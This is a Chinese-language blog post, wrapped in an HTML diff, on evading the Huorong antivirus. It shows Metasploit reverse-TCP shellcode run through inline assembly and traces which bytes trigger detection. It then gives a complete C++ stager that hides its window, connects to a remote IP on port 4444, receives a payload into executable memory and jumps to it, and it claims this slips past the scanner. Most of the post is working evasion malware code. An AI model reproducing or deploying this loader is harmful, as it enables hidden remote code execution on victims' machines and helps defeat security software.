@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>从火绒特征码识别到免杀的思考 |  小玉玉的博客</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <!-- mermaid -->
+      
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-从火绒特征码识别到免杀的思考"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  从火绒特征码识别到免杀的思考
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/04/19/%E4%BB%8E%E7%81%AB%E7%BB%92%E7%89%B9%E5%BE%81%E7%A0%81%E8%AF%86%E5%88%AB%E5%88%B0%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83/" class="article-date">
+  <time datetime="2022-04-19T08:22:46.000Z" itemprop="datePublished">2022-04-19</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">2.1k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">10 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="从火绒特征码识别到免杀的思考"><a href="#从火绒特征码识别到免杀的思考" class="headerlink" title="从火绒特征码识别到免杀的思考"></a>从火绒特征码识别到免杀的思考</h1><p>我们今天从一个比较特别的方式去思考免杀，就是从杀毒软件的病毒库去思考怎么去做免杀。</p>
+<p>免杀载体：msfpayload，用的汇编直接加载</p>
+<p>免杀目标：火绒</p>
+<h2 id="1-免杀载体介绍"><a href="#1-免杀载体介绍" class="headerlink" title="1.免杀载体介绍"></a>1.免杀载体介绍</h2><p>是一个简单的内联汇编加载shellcode的payload，为什么用这个呢，因为这个我们之后反汇编起来比较简单。</p>
+<p>代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker, <span class="meta-string">&quot;/section:.data,RWE&quot;</span>)<span class="comment">//对于内存的保护属性 可读可写可执行</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment( linker, <span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> buf[] =</span><br><span class="line"><span class="string">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x0c\x8b\x52\x14\x31\xff\x8b\x72\x28\x0f\xb7\x4a\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xef\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc0\x74\x4c\x01\xd0\x8b\x48\x18\x50\x8b\x58\x20\x01\xd3&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span></span><br><span class="line"><span class="string">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span></span><br><span class="line"><span class="string">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\x02\xd5\x68\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span></span><br><span class="line"><span class="string">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span></span><br><span class="line"><span class="string">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span></span><br><span class="line"><span class="string">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span></span><br><span class="line"><span class="string">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"> __asm</span><br><span class="line"> &#123;</span><br><span class="line"> <span class="comment">/*</span></span><br><span class="line"><span class="comment">	mov eax, offset buf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">	 lea eax, buf;</span><br><span class="line">	 call eax;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="2-找到火绒的识别依据"><a href="#2-找到火绒的识别依据" class="headerlink" title="2.找到火绒的识别依据"></a>2.找到火绒的识别依据</h2><p>我们这里使用myccl做为我们的工具。</p>
+<p><a target="_blank" rel="noopener" href="http://www.rsdown.cn/down/32780.html#download">MYCCL下载|特征码定位器MYCCL下载_红软基地 (rsdown.cn)</a></p>
+<p>首先我们先看看各个区段：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">程序启动正常!</span><br><span class="line">发现历史记录信息,已经成功导入!</span><br><span class="line">------------------------------------------------</span><br><span class="line">                PE文件 节表信息                 </span><br><span class="line"></span><br><span class="line">文件名:F:\b\C++学习\汇编花指令加载shellcode\Release\ConsoleApplication1.exe</span><br><span class="line">------------------------------------------------</span><br><span class="line">   .text	00000400	0000B200</span><br><span class="line">    .bss	00000000	00000000</span><br><span class="line">  .rdata	0000B600	00005C00</span><br><span class="line">   .data	00011200	00000A00</span><br><span class="line">   .rsrc	00011C00	00000200</span><br><span class="line">  .reloc	00011E00	00000E00</span><br></pre></td></tr></table></figure>
+<p>接下来我们把我们的payload分成1000份给火绒杀毒，二次处理之后的结果如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">执行二次处理中....</span><br><span class="line">[注意] 文件00011B34_0000004C出现特征码!</span><br><span class="line">执行二次处理中....</span><br><span class="line">(*)没有发现新的特征码....</span><br><span class="line">------------------------------------------------</span><br><span class="line">             &gt;&gt;复合特征码定位结果&lt;&lt;             </span><br><span class="line"></span><br><span class="line">文件名:F:\b\C++学习\汇编花指令加载shellcode\Release\ConsoleApplication1.exe</span><br><span class="line">------------------------------------------------</span><br><span class="line">特征码 物理地址&#x2F;物理长度 如下:</span><br><span class="line">[特征] 00011B34_0000004C</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">特征码分布示意图:</span><br><span class="line">[--------------------------------------------------]</span><br><span class="line">[--------------------------------------------------]</span><br><span class="line">[--------------------------------------------------]</span><br><span class="line">[--------------------------------------------------]</span><br><span class="line">[------------------------------------M-------------]</span><br></pre></td></tr></table></figure>
+<p>大家可以注意到00011B34是在00011200和00011C00之间的，也就是data字段，那么这个字段就是我们的变量存放的地方，然后回去看看我们的源代码，我们的源代码是只有shellcode作为我们的变量的，这个时候我们就分析出来，火绒是通过识别shellcode来做查杀的，那么问题来了，火绒具体是查杀的shellcode中的什么内容作为我们的依据的呢？</p>
+<h2 id="3-分析具体内容"><a href="#3-分析具体内容" class="headerlink" title="3.分析具体内容"></a>3.分析具体内容</h2><p>我们用二进制编辑器打开我们的payload并找到00011B34：</p>
+<p>我们计算一下00011B34+0000004C=11b80，也就是说从11b34开始一直到11b80都是我们需要查看的部分。</p>
+<p><img src="http://116.63.138.59:8080/images/2022/04/19/1.png" alt="1.png"></p>
+<p>现在二进制代码找到了，我们来看看汇编层面下是什么样子的，打开od，翻到text段第二行代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call eax</span><br></pre></td></tr></table></figure>
+<p>f7跟进去就是我们的shellcode的内容，然后找到一个比较好找的二进制序列，我这里用的是开头的“29、80、6b”。</p>
+<p><img src="http://116.63.138.59:8080/images/2022/04/19/2.png" alt="2.png"></p>
+<p>那么也就是说从这里开始一直往下到“83、f8”都是火绒识别的内容，那么这段代码的详细意思是什么呢？</p>
+<p>我们现在找到msf的源代码：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_reverse_tcp.asm">metasploit-framework/block_reverse_tcp.asm at master · rapid7/metasploit-framework (github.com)</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">reverse_tcp:</span><br><span class="line">  push 0x00003233        ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.</span><br><span class="line">  push 0x5F327377        ; ...</span><br><span class="line">  push esp               ; Push a pointer to the &quot;ws2_32&quot; string on the stack.</span><br><span class="line">  push 0x0726774C        ; hash( &quot;kernel32.dll&quot;, &quot;LoadLibraryA&quot; )</span><br><span class="line">  call ebp               ; LoadLibraryA( &quot;ws2_32&quot; )</span><br><span class="line">  </span><br><span class="line">  mov eax, 0x0190        ; EAX &#x3D; sizeof( struct WSAData )</span><br><span class="line">  sub esp, eax           ; alloc some space for the WSAData structure</span><br><span class="line">  push esp               ; push a pointer to this stuct</span><br><span class="line">  push eax               ; push the wVersionRequested parameter</span><br><span class="line">  push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br><span class="line">  call ebp               ; WSAStartup( 0x0190, &amp;WSAData );</span><br><span class="line">  </span><br><span class="line">  push eax               ; if we succeed, eax wil be zero, push zero for the flags param.</span><br><span class="line">  push eax               ; push null for reserved parameter</span><br><span class="line">  push eax               ; we do not specify a WSAPROTOCOL_INFO structure</span><br><span class="line">  push eax               ; we do not specify a protocol</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push SOCK_STREAM</span><br><span class="line">  inc eax                ;</span><br><span class="line">  push eax               ; push AF_INET</span><br><span class="line">  push 0xE0DF0FEA        ; hash( &quot;ws2_32.dll&quot;, &quot;WSASocketA&quot; )</span><br><span class="line">  call ebp               ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );</span><br><span class="line">  xchg edi, eax          ; save the socket for later, don&#39;t care about the value of eax after this</span><br><span class="line"></span><br><span class="line">set_address:</span><br><span class="line">  push byte 0x05         ; retry counter</span><br><span class="line">  push 0x0100007F        ; host 127.0.0.1</span><br><span class="line">  push 0x5C110002        ; family AF_INET and port 4444</span><br><span class="line">  mov esi, esp           ; save pointer to sockaddr struct</span><br><span class="line">  </span><br><span class="line">try_connect:</span><br><span class="line">  push byte 16           ; length of the sockaddr struct</span><br><span class="line">  push esi               ; pointer to the sockaddr struct</span><br><span class="line">  push edi               ; the socket</span><br><span class="line">  push 0x6174A599        ; hash( &quot;ws2_32.dll&quot;, &quot;connect&quot; )</span><br><span class="line">  call ebp               ; connect( s, &amp;sockaddr, 16 );</span><br><span class="line"></span><br><span class="line">  test eax,eax           ; non-zero means a failure</span><br><span class="line">  jz short connected</span><br><span class="line"></span><br><span class="line">handle_failure:</span><br><span class="line">  dec dword [esi+8]</span><br><span class="line">  jnz short try_connect</span><br><span class="line"></span><br><span class="line">failure:</span><br><span class="line">  push 0x56A2B5F0        ; hardcoded to exitprocess for size</span><br><span class="line">  call ebp</span><br><span class="line"></span><br><span class="line">connected:</span><br></pre></td></tr></table></figure>
+<p>现在请大家找到这一行：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">push 0x006B8029        ; hash( &quot;ws2_32.dll&quot;, &quot;WSAStartup&quot; )</span><br></pre></td></tr></table></figure>
+<p>我们的火绒就是从这里开始识别的（注意看刚才od里的截图）。</p>
+<p>msf的注释写的非常详细，这一大段代码其实就是建立wsa对象并且使用这个对象进行tcp链接。</p>
+<h2 id="4-免杀的思考"><a href="#4-免杀的思考" class="headerlink" title="4.免杀的思考"></a>4.免杀的思考</h2><p>那么既然这里是用的tcp的链接，我们又该如何去思考怎么做免杀呢？</p>
+<p>非常简单，替换方式，具体是什么方式呢？大家注意到没有，由于shellcode是要支持直接在内存中运行的代码，所以上面的代码中调用函数的过程全部都是通过hash的方式去调用的函数，那么除了hash调用的方法之外还有没有其他的呢？</p>
+<p>这里我仅提供一个思路，我们是不是可以使用最传统的方式，也就是自己写一个完整的pe结构然后导入表里面带上我们所需要的函数不就可以了嘛。</p>
+<p>具体代码如下：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span> (disable: 4996)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;WS2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	</span><br><span class="line">	ShowWindow(GetForegroundWindow(), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	WSADATA wsData;</span><br><span class="line">	<span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsData))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;WSAStartp fail.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">	SOCKADDR_IN server;</span><br><span class="line">	ZeroMemory(&amp;server, <span class="keyword">sizeof</span>(SOCKADDR_IN));</span><br><span class="line">	server.sin_family = AF_INET;</span><br><span class="line">	server.sin_addr.s_addr = inet_addr(<span class="string">&quot;192.168.2.213&quot;</span>); <span class="comment">//server ip</span></span><br><span class="line">	server.sin_port = htons(<span class="number">4444</span>); <span class="comment">//server port</span></span><br><span class="line">	<span class="keyword">if</span> (SOCKET_ERROR == connect(sock, (SOCKADDR*)&amp;server, <span class="keyword">sizeof</span>(server)))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;connect to server fail.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> Fail;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	u_int payloadLen;</span><br><span class="line">	<span class="keyword">if</span> (recv(sock, (<span class="keyword">char</span>*)&amp;payloadLen, <span class="keyword">sizeof</span>(payloadLen), <span class="number">0</span>) != <span class="keyword">sizeof</span>(payloadLen))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;recv error\n&quot;</span>);</span><br><span class="line">		<span class="keyword">goto</span> Fail;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span>* orig_buffer;</span><br><span class="line">	orig_buffer = (<span class="keyword">char</span>*)VirtualAlloc(<span class="literal">NULL</span>, payloadLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="keyword">char</span>* buffer;</span><br><span class="line">	buffer = orig_buffer;</span><br><span class="line">	<span class="keyword">int</span> ret;</span><br><span class="line">	ret = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ret = recv(sock, buffer, payloadLen, <span class="number">0</span>);</span><br><span class="line">		buffer += ret;</span><br><span class="line">		payloadLen -= ret;</span><br><span class="line">	&#125; <span class="keyword">while</span> (ret &gt; <span class="number">0</span> &amp;&amp; payloadLen &gt; <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov edi, sock;</span><br><span class="line">		jmp orig_buffer; </span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	VirtualFree(orig_buffer, <span class="number">0</span>, MEM_RELEASE);</span><br><span class="line"></span><br><span class="line">Fail:</span><br><span class="line"></span><br><span class="line">	closesocket(sock);</span><br><span class="line">	WSACleanup();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>上面的代码大家可以发现，我们整个wsa对象的创建、使用都是使用C++编写的，这样在我们编译的过程中我们所需要的函数就都在导入表里面了，整个代码相当于我们重新用C++写了一下火绒识别的地方，这样就没有什么“push 0x006B8029”这种立即数了而是直接call对应的函数就行，自然而然地，我们的二进制代码火绒也就识别不出来了。</p>
+<p><img src="http://116.63.138.59:8080/images/2022/04/19/3.png" alt="3.png"></p>
+<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4.总结"></a>4.总结</h2><p>思路很重要，大家学习免杀的时候不要光学代码去了，一定要思考为什么能免杀，为什么不能免杀，多从杀毒软件的角度去思考很重要。</p>
+<p>给大家一个思考题吧：除了hash和传统的导入表能用函数之外还有哪些方式呢？能不能尝试自己写一个呢？</p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://cutecuteyu.gitee.io/2022/04/19/%E4%BB%8E%E7%81%AB%E7%BB%92%E7%89%B9%E5%BE%81%E7%A0%81%E8%AF%86%E5%88%AB%E5%88%B0%E5%85%8D%E6%9D%80%E7%9A%84%E6%80%9D%E8%80%83/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2022/03/07/%E4%BF%84%E4%B9%8C%E7%BD%91%E7%BB%9C%E6%88%98%E4%B8%AD%E7%9A%84%E6%80%9D%E8%80%83/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">俄乌网络战中的思考</div>
+      </a>
+    
+  </nav>
+
+  
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2022
+        <i class="ri-heart-fill heart_icon"></i> 萌萌哒的小玉玉
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        
+        Powered by <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="division">|</span>
+        Theme - <a href="https://github.com/Shen-Yu/hexo-theme-ayer" target="_blank">Ayer</a>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="小玉玉的博客"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
